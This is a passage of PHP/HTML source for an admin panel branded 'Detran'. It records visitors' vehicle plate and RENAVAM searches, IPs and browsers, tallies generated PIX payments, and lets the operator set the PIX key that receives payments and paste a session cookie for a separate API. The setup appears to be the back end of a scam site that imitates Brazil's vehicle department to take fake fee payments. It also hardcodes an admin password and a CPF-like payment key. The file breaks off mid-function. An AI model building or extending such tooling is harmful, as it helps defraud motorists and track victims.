<?php
require_once __DIR__ . '/app_storage.php';
require_once __DIR__ . '/app_auth.php';
header('Content-Type: text/html; charset=UTF-8');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
date_default_timezone_set('America/Sao_Paulo');

// --- AUTHENTICATION ---
$admin_password = '113010';

if (isset($_GET['logout'])) {
    app_auth_clear('gratidao');
    header('Location: gratidao.php');
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login_password'])) {
    if ($_POST['login_password'] === $admin_password) {
        app_auth_set('gratidao', $admin_password);
        
        // Registrar IP do administrador
        $adminIpsFile = app_storage_path('admin_ips.json');
        $adminIps = app_list_read('admin_ips.json');
        $currentIp = $_SERVER['REMOTE_ADDR'];
        if (!in_array($currentIp, $adminIps)) {
            $adminIps[] = $currentIp;
            app_list_write('admin_ips.json', $adminIps);
        }

        header('Location: gratidao.php');
        exit;
    } else {
        $error = "Senha incorreta!";
    }
}

if (!app_auth_check('gratidao', $admin_password)) {
    ?>
    <!DOCTYPE html>
    <html lang="pt-br">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login Administrativo</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    </head>
    <body class="bg-gray-100 h-screen flex items-center justify-center">
        <div class="max-w-md w-full bg-white rounded-lg shadow-lg p-8">
            <div class="text-center mb-8">
                <div class="bg-blue-600 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
                    <i class="fas fa-lock text-white text-2xl"></i>
                </div>
                <h2 class="text-2xl font-bold text-gray-800">Painel Administrativo</h2>
                <p class="text-gray-500">Insira a senha para continuar</p>
            </div>

            <?php if (isset($error)): ?>
                <div class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-4 text-sm">
                    <?php echo $error; ?>
                </div>
            <?php endif; ?>

            <form method="POST">
                <div class="mb-6">
                    <label class="block text-gray-700 text-sm font-bold mb-2">Senha</label>
                    <input type="password" name="login_password" required
                        class="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
                        placeholder="••••••">
                </div>
                <button type="submit" 
                    class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded transition-colors">
                    Entrar
                </button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

$cfgPath = app_storage_path('pix_config.json');
$pixLogPath = app_storage_path('pix_log.json');
$searchLogPath = app_storage_path('search_log.json');
$clickStatsPath = app_storage_path('click_stats.json');

$msg = isset($_GET['msg']) ? (string)$_GET['msg'] : '';

// --- ACTIONS ---
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['reset_stats']) && $_POST['reset_stats'] === '1') {
        app_list_write('pix_log.json', []);
        app_list_write('search_log.json', []);
        app_click_stats_reset();
        app_list_write('pix_last.json', []);
        header('Location: gratidao.php?msg=' . urlencode('Todos os logs e estatísticas foram limpos.'));
        exit;
    } elseif (isset($_POST['pixKey'])) {
        $pixKey = trim((string)$_POST['pixKey']);
        $apiCookie = isset($_POST['apiCookie']) ? trim((string)$_POST['apiCookie']) : '';
        
        if ($pixKey !== '') {
            app_config_write('pix_config.json', $pixKey, $apiCookie);
            header('Location: gratidao.php?msg=' . urlencode('Configurações atualizadas com sucesso.'));
            exit;
        } else {
            header('Location: gratidao.php?msg=' . urlencode('Chave PIX inválida.'));
            exit;
        }
    }
}

// --- DATA LOADING ---
$currentKey = '06721661195';
$currentCookie = '';
$cfg = app_config_read('pix_config.json');
if ($cfg['pixKey'] !== '') {
    $currentKey = $cfg['pixKey'];
}
if ($cfg['apiCookie'] !== '') {
    $currentCookie = $cfg['apiCookie'];
}

$pixEntries = app_list_read('pix_log.json');
usort($pixEntries, function($a, $b) {
    return strtotime($b['ts'] ?? 0) - strtotime($a['ts'] ?? 0);
});

$searchEntries = app_list_read('search_log.json');
usort($searchEntries, function($a, $b) {
    return strtotime($b['ts'] ?? 0) - strtotime($a['ts'] ?? 0);
});

$clickStats = app_click_stats_read();

// --- HELPER FUNCTIONS ---
function parse_ua($ua) {
    $device = 'Desktop';
    $icon = '💻'; // Desktop icon
    
    if (preg_match('/(android|iphone|ipad|mobile)/i', $ua)) {
        $device = 'Celular';
        $icon = '📱'; // Mobile icon
    } elseif (preg_match('/tablet/i', $ua)) {
        $device = 'Tablet';
        $icon = '📱';
    }

    $browser = 'Desconhecido';
    if (preg_match('/chrome/i', $ua) && !preg_match('/edge/i', $ua)) $browser = 'Chrome';
    elseif (preg_match('/firefox/i', $ua)) $browser = 'Firefox';
    elseif (preg_match('/safari/i', $ua) && !preg_match('/chrome/i', $ua)) $browser = 'Safari';
    elseif (preg_match('/edge/i', $ua)) $browser = 'Edge';
    elseif (preg_match('/opera|opr/i', $ua)) $browser = 'Opera';
    elseif (preg_match('/msie|trident/i', $ua)) $browser = 'IE';

    return ['type' => $device, 'browser' => $browser, 'icon' => $icon];
}

function time_elapsed_string($datetime, $full = false) {
    $now = new DateTime;
    $ago = new DateTime($datetime);
    $diff = $now->diff($ago);

    $weeks = intdiv($diff->d, 7);
    $days = $diff->d % 7;

    $parts = [
        'y' => ['label' => 'ano', 'value' => $diff->y],
        'm' => ['label' => 'mês', 'value' => $diff->m],
        'w' => ['label' => 'semana', 'value' => $weeks],
        'd' => ['label' => 'dia', 'value' => $days],
        'h' => ['label' => 'hora', 'value' => $diff->h],
        'i' => ['label' => 'minuto', 'value' => $diff->i],
        's' => ['label' => 'segundo', 'value' => $diff->s],
    ];

    $string = [];
    foreach ($parts as $part) {
        if ($part['value']) {
            $string[] = $part['value'] . ' ' . $part['label'] . ($part['value'] > 1 ? 's' : '');
        }
    }

    if (!$full) {
        $string = array_slice($string, 0, 1);
    }

    return $string ? implode(', ', $string) . ' atrás' : 'agora mesmo';
}

// Stats Calculation
$totalPixValue = 0;
foreach ($pixEntries as $p) $totalPixValue += ($p['valor'] ?? 0);

$uniqueIps = [];
foreach ($searchEntries as $s) if (isset($s['ip'])) $uniqueIps[$s['ip']] = true;
foreach ($pixEntries as $p) if (isset($p['ip'])) $uniqueIps[$p['ip']] = true;
$totalUniqueVisitors = count($uniqueIps);
$dashboardState = [
    'currentKey' => $currentKey,
    'currentCookie' => $currentCookie,
    'configUpdatedAt' => $cfg['updated_at'],
    'defaultPixKey' => '06721661195',
    'pixEntries' => array_values($pixEntries),
    'searchEntries' => array_values($searchEntries),
    'clickStats' => $clickStats,
    'statsResetAt' => $clickStats['reset_at'],
    'statsUpdatedAt' => $clickStats['updated_at'],
    'message' => $msg,
];

?>
<!doctype html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard Administrativo - Detran</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
        body { font-family: 'Inter', sans-serif; background-color: #f3f4f6; }
        .card { background: white; border-radius: 0.75rem; box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06); }
        .table-row-hover:hover { background-color: #f9fafb; }
        .status-badge { padding: 0.25rem 0.625rem; border-radius: 9999px; font-size: 0.75rem; font-weight: 500; }
        .badge-success { background-color: #d1fae5; color: #065f46; }
        .badge-blue { background-color: #dbeafe; color: #1e40af; }
    </style>
</head>
<body class="text-gray-800">

<div class="min-h-screen flex flex-col">
    <!-- Navbar -->
    <nav class="bg-white shadow-sm border-b border-gray-200">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex justify-between h-16">
                <div class="flex items-center">
                    <i class="fas fa-shield-alt text-blue-600 text-2xl mr-3"></i>
                    <span class="font-bold text-xl text-gray-900">Admin Dashboard</span>
                </div>
                <div class="flex items-center space-x-4">
                    <div class="text-sm text-gray-500">
                        <i class="fas fa-clock mr-1"></i> <?php echo date('d/m/Y H:i'); ?>
                    </div>
                    <a href="?logout=1" class="text-sm font-medium text-red-600 hover:text-red-800 transition-colors">
                        <i class="fas fa-sign-out-alt mr-1"></i> Sair
                    </a>
                </div>
            </div>
        </div>
    </nav>

    <main class="flex-1 max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-8">
        
        <?php if ($msg): ?>
            <div class="mb-6 p-4 rounded-md <?php echo strpos($msg, 'sucesso') !== false || strpos($msg, 'limpos') !== false ? 'bg-green-50 text-green-700 border border-green-200' : 'bg-red-50 text-red-700 border border-red-200'; ?> flex items-center shadow-sm">
                <i class="fas <?php echo strpos($msg, 'sucesso') !== false || strpos($msg, 'limpos') !== false ? 'fa-check-circle' : 'fa-exclamation-circle'; ?> mr-3 text-lg"></i>
                <?php echo htmlspecialchars($msg); ?>
            </div>
        <?php endif; ?>

        <!-- Stats Grid -->
        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
            <!-- Card 1 -->
            <div class="card p-6 border-l-4 border-blue-500">
                <div class="flex items-center justify-between">
                    <div>
                        <p class="text-sm font-medium text-gray-500">Total PIX Gerado</p>
                        <p id="stat-total-pix-value" class="text-2xl font-bold text-gray-900 mt-1">R$ <?php echo number_format($totalPixValue, 2, ',', '.'); ?></p>
                    </div>
                    <div class="p-3 bg-blue-50 rounded-full text-blue-600">
                        <i class="fas fa-dollar-sign text-xl"></i>
                    </div>
                </div>
                <div class="mt-4 text-xs text-gray-500">
                    <span id="stat-total-pix-count" class="text-green-600 font-medium"><i class="fas fa-arrow-up"></i> <?php echo count($pixEntries); ?></span> transações
                </div>
            </div>

            <!-- Card 2 -->
            <div class="card p-6 border-l-4 border-green-500">
                <div class="flex items-center justify-between">
                    <div>
                        <p class="text-sm font-medium text-gray-500">Buscas Realizadas</p>
                        <p id="stat-search-count" class="text-2xl font-bold text-gray-900 mt-1"><?php echo count($searchEntries); ?></p>
                    </div>
                    <div class="p-3 bg-green-50 rounded-full text-green-600">
                        <i class="fas fa-search text-xl"></i>
                    </div>
                </div>
                <div class="mt-4 text-xs text-gray-500">
                    Consultas de placa/renavam
                </div>
            </div>

            <!-- Card 3 -->
            <div class="card p-6 border-l-4 border-purple-500">
                <div class="flex items-center justify-between">
                    <div>
                        <p class="text-sm font-medium text-gray-500">Visitantes Únicos</p>
                        <p id="stat-unique-visitors" class="text-2xl font-bold text-gray-900 mt-1"><?php echo $totalUniqueVisitors; ?></p>
                    </div>
                    <div class="p-3 bg-purple-50 rounded-full text-purple-600">
                        <i class="fas fa-users text-xl"></i>
                    </div>
                </div>
                <div class="mt-4 text-xs text-gray-500">
                    Baseado em IP
                </div>
            </div>

            <!-- Card 4 -->
            <div class="card p-6 border-l-4 border-orange-500">
                <div class="flex items-center justify-between">
                    <div>
                        <p class="text-sm font-medium text-gray-500">Acessos à Página</p>
                        <p id="stat-enter-clicks" class="text-2xl font-bold text-gray-900 mt-1"><?php echo $clickStats['enter_clicks'] ?? 0; ?></p>
                    </div>
                    <div class="p-3 bg-orange-50 rounded-full text-orange-600">
                        <i class="fas fa-mouse-pointer text-xl"></i>
                    </div>
                </div>
                <div class="mt-4 text-xs text-gray-500">
                    Cliques em "Consultar" (Home): <b id="stat-consultar-clicks"><?php echo $clickStats['consultar_clicks'] ?? 0; ?></b>
                </div>
            </div>
        </div>

        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
            
            <!-- Left Column: Logs -->
            <div class="lg:col-span-2 space-y-8">
                
                <!-- PIX Logs Section -->
                <div class="card overflow-hidden">
                    <div class="px-6 py-4 border-b border-gray-100 flex justify-between items-center bg-gray-50">
                        <h3 class="font-bold text-gray-800"><i class="fas fa-receipt mr-2 text-blue-600"></i>Últimos PIX Gerados</h3>
                        <span id="pix-count-badge" class="text-xs font-medium bg-blue-100 text-blue-800 py-1 px-2 rounded-full"><?php echo count($pixEntries); ?> registros</span>
                    </div>
                    <div class="overflow-x-auto">
                        <table class="w-full text-sm text-left">
                            <thead class="text-xs text-gray-500 uppercase bg-gray-50 border-b">
                                <tr>
                                    <th class="px-6 py-3">Data</th>
                                    <th class="px-6 py-3">Veículo</th>
                                    <th class="px-6 py-3">Valor</th>
                                    <th class="px-6 py-3">IP / Dispositivo</th>
                                </tr>
                            </thead>
                            <tbody id="pix-table-body" class="divide-y divide-gray-100">
                                <?php if (empty($pixEntries)): ?>
                                    <tr><td colspan="4" class="px-6 py-8 text-center text-gray-500">Nenhum registro encontrado.</td></tr>
                                <?php else: ?>
                                    <?php foreach (array_slice($pixEntries, 0, 10) as $pix): 
                                        $uaInfo = parse_ua($pix['ua'] ?? '');
                                    ?>
                                    <tr class="table-row-hover transition-colors">
                                        <td class="px-6 py-4">
                                            <div class="font-medium text-gray-900"><?php echo date('d/m/Y', strtotime($pix['ts'])); ?></div>
                                            <div class="text-xs text-gray-500"><?php echo date('H:i:s', strtotime($pix['ts'])); ?></div>
                                        </td>
                                        <td class="px-6 py-4">
                                            <div class="font-medium text-gray-900"><?php echo htmlspecialchars($pix['placa'] ?: 'N/A'); ?></div>
                                            <div class="text-xs text-gray-500"><?php echo htmlspecialchars($pix['renavam'] ?: 'Renavam N/A'); ?></div>
                                            <div class="text-xs text-gray-400 mt-1"><?php echo htmlspecialchars(substr($pix['descricao'], 0, 20)); ?>...</div>
                                        </td>
                                        <td class="px-6 py-4">
                                            <span class="status-badge badge-success">
                                                <?php echo htmlspecialchars($pix['valor_brl']); ?>
                                            </span>
                                        </td>
                                        <td class="px-6 py-4">
                                            <div class="flex items-center gap-2 mb-1">
                                                <span class="font-mono text-xs bg-gray-100 px-2 py-1 rounded"><?php echo htmlspecialchars($pix['ip'] ?? 'N/A'); ?></span>
                                            </div>
                                            <div class="text-xs text-gray-500 flex items-center gap-1">
                                                <span><?php echo $uaInfo['icon']; ?></span>
                                                <span><?php echo $uaInfo['type']; ?></span>
                                                <span class="text-gray-300">|</span>
                                                <span><?php echo $uaInfo['browser']; ?></span>
                                            </div>
                                        </td>
                                    </tr>
                                    <?php endforeach; ?>
                                <?php endif; ?>
                            </tbody>
                        </table>
                    </div>
                    <?php if (count($pixEntries) > 10): ?>
                    <div class="px-6 py-3 bg-gray-50 border-t border-gray-100 text-center">
                        <button class="text-sm text-blue-600 font-medium hover:text-blue-800">Ver todos os registros</button>
                    </div>
                    <?php endif; ?>
                </div>

                <!-- Search Logs Section -->
                <div class="card overflow-hidden">
                    <div class="px-6 py-4 border-b border-gray-100 flex justify-between items-center bg-gray-50">
                        <h3 class="font-bold text-gray-800"><i class="fas fa-search mr-2 text-green-600"></i>Histórico de Buscas</h3>
                        <span id="search-count-badge" class="text-xs font-medium bg-green-100 text-green-800 py-1 px-2 rounded-full"><?php echo count($searchEntries); ?> registros</span>
                    </div>
                    <div class="overflow-x-auto">
                        <table class="w-full text-sm text-left">
                            <thead class="text-xs text-gray-500 uppercase bg-gray-50 border-b">
                                <tr>
                                    <th class="px-6 py-3">Tempo</th>
                                    <th class="px-6 py-3">Consulta</th>
                                    <th class="px-6 py-3">IP / Navegador</th>
                                </tr>
                            </thead>
                            <tbody id="search-table-body" class="divide-y divide-gray-100">
                                <?php if (empty($searchEntries)): ?>
                                    <tr><td colspan="3" class="px-6 py-8 text-center text-gray-500">Nenhuma busca registrada ainda.</td></tr>
                                <?php else: ?>
                                    <?php foreach (array_slice($searchEntries, 0, 10) as $search): 
                                        $uaInfo = parse_ua($search['ua'] ?? '');
                                    ?>
                                    <tr class="table-row-hover transition-colors">
                                        <td class="px-6 py-4 whitespace-nowrap">
                                            <div class="text-sm font-medium text-gray-900"><?php echo time_elapsed_string($search['ts']); ?></div>
                                            <div class="text-xs text-gray-400"><?php echo date('d/m H:i', strtotime($search['ts'])); ?></div>
                                        </td>
                                        <td class="px-6 py-4">
                                            <div class="flex items-center gap-3">
                                                <div class="bg-gray-100 p-2 rounded text-center min-w-[80px]">
                                                    <div class="text-xs text-gray-500 uppercase">Placa</div>
                                                    <div class="font-bold text-gray-900"><?php echo htmlspecialchars($search['plate'] ?? '-'); ?></div>
                                                </div>
                                                <div class="text-xs text-gray-500">
                                                    <div>Renavam: <span class="font-mono text-gray-700"><?php echo htmlspecialchars($search['renavam'] ?? '-'); ?></span></div>
                                                </div>
                                            </div>
                                        </td>
                                        <td class="px-6 py-4">
                                            <div class="flex items-center gap-2 mb-1">
                                                <span class="font-mono text-xs bg-gray-100 px-2 py-1 rounded"><?php echo htmlspecialchars($search['ip'] ?? 'N/A'); ?></span>
                                            </div>
                                            <div class="text-xs text-gray-500 flex items-center gap-1">
                                                <span title="<?php echo $uaInfo['type']; ?>"><?php echo $uaInfo['icon']; ?></span>
                                                <span><?php echo $uaInfo['browser']; ?></span>
                                            </div>
                                        </td>
                                    </tr>
                                    <?php endforeach; ?>
                                <?php endif; ?>
                            </tbody>
                        </table>
                    </div>
                </div>

            </div>

            <!-- Right Column: Config & Tools -->
            <div class="space-y-8">
                
                <!-- Config Card -->
                <div class="card p-6">
                    <h3 class="font-bold text-gray-800 mb-4 flex items-center"><i class="fas fa-cog mr-2 text-gray-600"></i>Configurações</h3>
                    
                    <form id="config-form" method="post" class="space-y-4">
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1">Chave PIX Recebedora</label>
                            <div class="flex rounded-md shadow-sm">
                                <span class="inline-flex items-center px-3 rounded-l-md border border-r-0 border-gray-300 bg-gray-50 text-gray-500 text-sm">
                                    <i class="fas fa-key"></i>
                                </span>
                                <input id="pix-key-input" type="text" name="pixKey" value="<?php echo htmlspecialchars($currentKey); ?>" class="flex-1 min-w-0 block w-full px-3 py-2 rounded-none rounded-r-md border border-gray-300 focus:ring-blue-500 focus:border-blue-500 sm:text-sm" placeholder="CPF, Email, Telefone...">
                            </div>
                            <p class="mt-1 text-xs text-gray-500">Chave para onde serão enviados os pagamentos.</p>
                        </div>
                        
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1">Cookie de Sessão (api.php)</label>
                            <div class="flex rounded-md shadow-sm">
                                <span class="inline-flex items-center px-3 rounded-l-md border border-r-0 border-gray-300 bg-gray-50 text-gray-500 text-sm">
                                    <i class="fas fa-cookie-bite"></i>
                                </span>
                                <input id="api-cookie-input" type="text" name="apiCookie" value="<?php echo htmlspecialchars($currentCookie); ?>" class="flex-1 min-w-0 block w-full px-3 py-2 rounded-none rounded-r-md border border-gray-300 focus:ring-blue-500 focus:border-blue-500 sm:text-sm" placeholder="Cole aqui o cookie (58cd35face...)">
                            </div>
                            <p class="mt-1 text-xs text-gray-500">Cole o cookie necessário para o funcionamento da api.php.</p>
                        </div>

                        <button type="submit" class="w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 transition-colors">
                            Salvar Alterações
                        </button>
                    </form>
                </div>

                <!-- Danger Zone -->
                <div class="card p-6 border-t-4 border-red-500">
                    <h3 class="font-bold text-red-600 mb-4 flex items-center"><i class="fas fa-exclamation-triangle mr-2"></i>Área de Perigo</h3>
                    <p class="text-sm text-gray-600 mb-4">Esta ação irá apagar permanentemente todos os registros de buscas, logs de PIX e contadores de cliques.</p>
                    
                    <form id="reset-form" method="post" onsubmit="return confirm('Tem certeza absoluta? Todos os dados serão perdidos.');">
                        <input type="hidden" name="reset_stats" value="1">
                        <button type="submit" class="w-full flex justify-center py-2 px-4 border border-red-300 rounded-md shadow-sm text-sm font-medium text-red-700 bg-white hover:bg-red-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500 transition-colors">
                            <i class="fas fa-trash-alt mr-2 mt-0.5"></i> Limpar Todos os Dados
                        </button>
                    </form>
                </div>

                <!-- System Info -->
                <div class="card p-6 bg-gray-50">
                    <h3 class="font-bold text-gray-800 mb-3 text-sm uppercase tracking-wide">Info do Sistema</h3>
                    <ul class="text-xs space-y-2 text-gray-600">
                        <li class="flex justify-between"><span>PHP Version:</span> <span class="font-mono"><?php echo phpversion(); ?></span></li>
                        <li class="flex justify-between"><span>Server IP:</span> <span class="font-mono"><?php echo $_SERVER['SERVER_ADDR'] ?? 'Localhost'; ?></span></li>
                        <li class="flex justify-between"><span>Client IP:</span> <span class="font-mono"><?php echo $_SERVER['REMOTE_ADDR']; ?></span></li>
                        <li class="flex justify-between"><span>Log PIX Size:</span> <span class="font-mono"><?php echo file_exists($pixLogPath) ? round(filesize($pixLogPath)/1024, 1) . ' KB' : '0 KB'; ?></span></li>
                    </ul>
                </div>

            </div>
        </div>
    </main>
</div>

<script>
const dashboardStorageKey = 'gratidao_dashboard_state_v2';
const serverDashboardState = <?php echo json_encode($dashboardState, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES); ?>;

function safeParseDashboardState(rawValue) {
    if (!rawValue) return null;
    try {
        const parsed = JSON.parse(rawValue);
        return parsed && typeof parsed === 'object' ? parsed : null;
    } catch (error) {
        return null;
    }
}

function normalizeArray(value) {
    return Array.isArray(value) ? value : [];
}

function normalizeClickStats(value) {
    return {
        consultar_clicks: Number(value && value.consultar_clicks ? value.consultar_clicks : 0),
        enter_clicks: Number(value && value.enter_clicks ? value.enter_clicks : 0),
        updated_at: value && value.updated_at ? String(value.updated_at) : '',
        reset_at: value && value.reset_at ? String(value.reset_at) : ''
    };
}

function getTimestampValue(value) {
    return Date.parse(value || '') || 0;
}

function uniqueByKey(items, makeKey) {
    const map = new Map();
    normalizeArray(items).forEach((item) => {
        if (!item || typeof item !== 'object') return;
        const key = makeKey(item);
        if (!map.has(key)) {
            map.set(key, item);
        }
    });
    return Array.from(map.values());
}

function sortByTimestampDesc(items) {
    return normalizeArray(items).sort((a, b) => {
        const left = Date.parse(a && a.ts ? a.ts : 0) || 0;
        const right = Date.parse(b && b.ts ? b.ts : 0) || 0;
        return right - left;
    });
}

function mergeEntries(serverItems, cachedItems, makeKey) {
    return sortByTimestampDesc(uniqueByKey(
        normalizeArray(serverItems).concat(normalizeArray(cachedItems)),
        makeKey
    ));
}

function mergeDashboardState(serverState, cachedState) {
    const defaultPixKey = serverState.defaultPixKey || '06721661195';
    const serverResetAt = getTimestampValue(serverState.statsResetAt || (serverState.clickStats && serverState.clickStats.reset_at) || '');
    const cachedResetAt = getTimestampValue(cachedState && cachedState.statsResetAt ? cachedState.statsResetAt : (cachedState && cachedState.clickStats ? cachedState.clickStats.reset_at : ''));
    const effectiveResetAt = Math.max(serverResetAt, cachedResetAt);
    const filterByReset = (items) => normalizeArray(items).filter((item) => {
        if (!effectiveResetAt) return true;
        const itemTs = getTimestampValue(item && item.ts ? item.ts : '');
        return itemTs >= effectiveResetAt;
    });
    const mergedPixEntries = mergeEntries(
        filterByReset(serverState.pixEntries),
        filterByReset(cachedState ? cachedState.pixEntries : []),
        (item) => [item.ts || '', item.placa || '', item.renavam || '', item.valor_brl || '', item.ip || ''].join('|')
    );
    const mergedSearchEntries = mergeEntries(
        filterByReset(serverState.searchEntries),
        filterByReset(cachedState ? cachedState.searchEntries : []),
        (item) => [item.ts || '', item.plate || '', item.renavam || '', item.ip || ''].join('|')
    );
    const serverClicks = normalizeClickStats(serverState.clickStats);
    const cachedClicks = normalizeClickStats(cachedState ? cachedState.clickStats : null);
    const serverConfigUpdatedAt = getTimestampValue(serverState.configUpdatedAt || '');
    const cachedConfigUpdatedAt = getTimestampValue(cachedState && cachedState.configUpdatedAt ? cachedState.configUpdatedAt : '');
    const useServerConfig = serverConfigUpdatedAt >= cachedConfigUpdatedAt;
    const serverStatsUpdatedAt = getTimestampValue(serverState.statsUpdatedAt || serverClicks.updated_at || '');
    const cachedStatsUpdatedAt = getTimestampValue(cachedState && cachedState.statsUpdatedAt ? cachedState.statsUpdatedAt : cachedClicks.updated_at);
    const useServerStats = serverResetAt > cachedResetAt || (serverResetAt === cachedResetAt && serverStatsUpdatedAt >= cachedStatsUpdatedAt);

    const currentKey = useServerConfig
        ? (serverState.currentKey || (cachedState && cachedState.currentKey ? cachedState.currentKey : defaultPixKey))
        : (cachedState && cachedState.currentKey ? cachedState.currentKey : serverState.currentKey);

    const currentCookie = useServerConfig
        ? (serverState.currentCookie || (cachedState && cachedState.currentCookie ? cachedState.currentCookie : ''))
        : (cachedState && cachedState.currentCookie ? cachedState.currentCookie : serverState.currentCookie);

    const clickStats = useServerStats
        ? {
            consultar_clicks: serverClicks.consultar_clicks,
            enter_clicks: serverClicks.enter_clicks,
            updated_at: serverState.statsUpdatedAt || serverClicks.updated_at || '',
            reset_at: serverState.statsResetAt || serverClicks.reset_at || ''
        }
        : {
            consultar_clicks: cachedClicks.consultar_clicks,
            enter_clicks: cachedClicks.enter_clicks,
            updated_at: cachedState && cachedState.statsUpdatedAt ? cachedState.statsUpdatedAt : cachedClicks.updated_at,
            reset_at: cachedState && cachedState.statsResetAt ? cachedState.statsResetAt : cachedClicks.reset_at
        };

    return {
        defaultPixKey: defaultPixKey,
        currentKey: currentKey,
        currentCookie: currentCookie,
        configUpdatedAt: useServerConfig ? (serverState.configUpdatedAt || '') : (cachedState && cachedState.configUpdatedAt ? cachedState.configUpdatedAt : ''),
        pixEntries: mergedPixEntries,
        searchEntries: mergedSearchEntries,
        clickStats: clickStats,
        statsResetAt: clickStats.reset_at || '',
        statsUpdatedAt: clickStats.updated_at || '',
        message: serverState.message || ''
    };
}

function escapeHtml(value) {
    return String(value == null ? '' : value)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

function parseUa(ua) {
    const value = String(ua || '');
    let type = 'Desktop';
    let icon = '💻';

    if (/(android|iphone|ipad|mobile)/i.test(value)) {
        type = 'Celular';
        icon = '📱';
    } else if (/tablet/i.test(value)) {
        type = 'Tablet';
        icon = '📱';
    }

    let browser = 'Desconhecido';
    if (/chrome/i.test(value) && !/edge/i.test(value)) browser = 'Chrome';
    else if (/firefox/i.test(value)) browser = 'Firefox';
    else if (/safari/i.test(value) && !/chrome/i.test(value)) browser = 'Safari';
    else if (/edge/i.test(value)) browser = 'Edge';
    else if (/opera|opr/i.test(value)) browser = 'Opera';
    else if (/msie|trident/i.test(value)) browser = 'IE';

    return { type, browser, icon };
}

function formatMoneyBrl(numberValue) {
    const amount = Number(numberValue || 0);
    return amount.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

function formatDate(dateString, options) {
    const date = new Date(dateString);
    if (Number.isNaN(date.getTime())) return '-';
    return new Intl.DateTimeFormat('pt-BR', options).format(date);
}

function formatElapsed(dateString) {
    const date = new Date(dateString);
    if (Number.isNaN(date.getTime())) return 'agora mesmo';

    let diffSeconds = Math.max(0, Math.floor((Date.now() - date.getTime()) / 1000));
    const units = [
        ['ano', 31536000],
        ['mês', 2592000],
        ['semana', 604800],
        ['dia', 86400],
        ['hora', 3600],
        ['minuto', 60],
        ['segundo', 1]
    ];
    const parts = [];

    units.forEach(([name, seconds]) => {
        if (parts.length >= 2) return;
        const value = Math.floor(diffSeconds / seconds);
        if (value > 0) {
            parts.push(value + ' ' + name + (value > 1 ? 's' : ''));
            diffSeconds -= value * seconds;
        }
    });

    return parts.length ? parts.join(', ') + ' atrás' : 'agora mesmo';
}

function renderPixRows(entries) {
    const tbody = document.getElementById('pix-table-body');
    if (!tbody) return;
    const list = normalizeArray(entries).slice(0, 10);

    if (!list.length) {
        tbody.innerHTML = '<tr><td colspan="4" class="px-6 py-8 text-center text-gray-500">Nenhum registro encontrado.</td></tr>';
        return;
    }

    tbody.innerHTML = list.map((pix) => {
        const uaInfo = parseUa(pix.ua || '');
        const descricao = String(pix.descricao || '');
        const descricaoShort = descricao.length > 20 ? descricao.slice(0, 20) + '...' : descricao;
        return `
            <tr class="table-row-hover transition-colors">
                <td class="px-6 py-4">
                    <div class="font-medium text-gray-900">${escapeHtml(formatDate(pix.ts, { day: '2-digit', month: '2-digit', year: 'numeric' }))}</div>
                    <div class="text-xs text-gray-500">${escapeHtml(formatDate(pix.ts, { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false }))}</div>
                </td>
                <td class="px-6 py-4">
                    <div class="font-medium text-gray-900">${escapeHtml(pix.placa || 'N/A')}</div>
                    <div class="text-xs text-gray-500">${escapeHtml(pix.renavam || 'Renavam N/A')}</div>
                    <div class="text-xs text-gray-400 mt-1">${escapeHtml(descricaoShort)}</div>
                </td>
                <td class="px-6 py-4">
                    <span class="status-badge badge-success">${escapeHtml(pix.valor_brl || ('R$ ' + formatMoneyBrl(pix.valor || 0)))}</span>
                </td>
                <td class="px-6 py-4">
                    <div class="flex items-center gap-2 mb-1">
                        <span class="font-mono text-xs bg-gray-100 px-2 py-1 rounded">${escapeHtml(pix.ip || 'N/A')}</span>
                    </div>
                    <div class="text-xs text-gray-500 flex items-center gap-1">
                        <span>${escapeHtml(uaInfo.icon)}</span>
                        <span>${escapeHtml(uaInfo.type)}</span>
                        <span class="text-gray-300">|</span>
                        <span>${escapeHtml(uaInfo.browser)}</span>
                    </div>
                </td>
            </tr>
        `;
    }).join('');
}

function renderSearchRows(entries) {
    const tbody = document.getElementById('search-table-body');
    if (!tbody) return;
    const list = normalizeArray(entries).slice(0, 10);

    if (!list.length) {
        tbody.innerHTML = '<tr><td colspan="3" class="px-6 py-8 text-center text-gray-500">Nenhuma busca registrada ainda.</td></tr>';
        return;
    }

    tbody.innerHTML = list.map((search) => {
